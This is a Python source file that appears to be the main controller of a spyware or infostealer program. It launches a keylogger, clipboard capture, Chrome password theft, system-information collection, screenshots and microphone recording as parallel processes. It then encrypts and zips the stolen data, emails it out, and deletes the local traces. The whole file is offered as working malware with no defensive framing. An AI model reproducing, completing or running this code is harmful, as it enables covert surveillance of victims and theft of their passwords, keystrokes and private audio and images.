# from components import *
# from encryption import *

import multiprocessing as mp
from multiprocessing import Queue, Pipe, Manager
from ctypes import c_char, c_char_p
from components.keycap import *
from components.checkService import *
from components.cc import CC
from components.chromeGrab import *
from components.sysInfo import *
from components.ss import Ss
from components.mic import Mic
from encryption.encrypt import SecureFiles
from components.fileManipulation import FileManipulation
from components.makeZip import ZipFiles
from components.sendMail import SendMail


def info_at_once_day(ifo_resp):
    called = False
    check = False
    while True:
        if not called:
            Main = ChromePassword()
            Main.get_chrome_db()
            Main.save_passwords()
            sys_info = SysInfo()
            sys_info.computer_information()
            called = True
            if check:
                break
        
        else:
            check = ifo_resp.value
            if check:
                called = False
        
def controlled_enc():
    secure_file = SecureFiles()
    secure_file.fernet_encrypt()
    secure_file.encrypt_file()       
    
    file_manipulation = FileManipulation("rm",["*.txt","*.png","*.wav"])
    file_manipulation.cap_file_list()

def files_to_zip():
    f_to_zip = ZipFiles()
    f_to_zip.make_zip()
    f_to_zip.make7_zip()
    
    file_manipulation = FileManipulation("rm",["*.enc","*.zip"])
    file_manipulation.cap_file_list()

if __name__ == '__main__':

    """>>---> Service Check for KeyCap Module <---<<"""
    side_1,side_2 = Pipe()
    
    srvce_chk_obj_kcp = CheckService("keycap")
    kcp_p_mon = mp.Process(target=srvce_chk_obj_kcp.revoke_service,args = (side_1,side_2,None))
    kcp_p_mon.start()
 
    kcp_obj = Keylogger()
    kcp_p = mp.Process(target=kcp_obj.__keylog__,args = (side_1,side_2,))
    kcp_p.start()
 
 
    """>>---> Service Check for CC Module <---<<"""
    manager = Manager()
    resp = manager.Value(c_char_p,"")
    
    srvce_chk_obj_cc = CheckService("cc")
    cc_p_mon = mp.Process(target=srvce_chk_obj_cc.revoke_service,args = [None,None,resp])
    cc_p_mon.start()
    
    cc_obj = CC()
    cc_p = mp.Process(target=cc_obj.cpy_clip,args=[resp])
    cc_p.start()

    
    """>>---> Service Check for SS Module <---<<"""
    ss_manager = Manager()
    ss_resp = ss_manager.Value(c_char_p,"")
    
    srvce_chk_obj_ss = CheckService("ss")
    ss_p_mon = mp.Process(target=srvce_chk_obj_ss.revoke_service,args = [None,None,ss_resp])
    ss_p_mon.start()
    
    ss_obj = Ss()
    ss_p = mp.Process(target=ss_obj.screen_shot,args=[ss_resp])
    ss_p.start()

    
    # """>>---> Service Check for Mic Module <---<<"""
    mic_manager = Manager()
    mic_resp = mic_manager.Value(c_char_p,"")

    srvce_chk_obj_mic = CheckService("mic")
    mic_p_mon = mp.Process(target=srvce_chk_obj_mic.revoke_service,args = [None,None,mic_resp])
    mic_p_mon.start()
    
    mic_obj = Mic()
    mic_p = mp.Process(target=mic_obj.microphone,args= [mic_resp])
    mic_p.start()
    
    
    """>>---> Service Check for InfoAtOnceDay Module <---<<"""
    ifo_manager = Manager()
    ifo_resp = ifo_manager.Value(c_char_p,"")

    srvce_chk_obj_day = CheckService("info_at_once_day")
    ifo_day_mon = mp.Process(target=srvce_chk_obj_day.revoke_service,args = [None,None,ifo_resp])
    ifo_day_mon.start()
        
    ifo_day_p = mp.Process(target=info_at_once_day,args = [ifo_resp])
    ifo_day_p.start()
    
    
    # """>>---> Service Check for Joining Module <---<<"""
    kcp_p_mon.join()
    kcp_p.join()

    cc_p_mon.join()
    cc_p.join()

    ss_p_mon.join()
    ss_p.join()

    mic_p_mon.join()
    mic_p.join()

    ifo_day_mon.join()
    ifo_day_p.join()


    # """>>---> Service Check for Joining Module <---<<"""
    enc_process = mp.Process(target=controlled_enc)
    enc_process.start()
    enc_process.join()
    
    # """>>---> Service Check for Zip Module <---<<"""
    zip_process = mp.Process(target=files_to_zip)
    zip_process.start()
    zip_process.join()
    
    # """>>---> Service Check for SendMail Module <---<<"""
    send_main_obj = SendMail()
    
    send_mail_process = mp.Process(target = send_main_obj.send_mail)
    send_mail_process.start()
    send_mail_process.join()
    
    file_manipulation = FileManipulation("rm",["*.7z"])
    file_manipulation.cap_file_list()    
    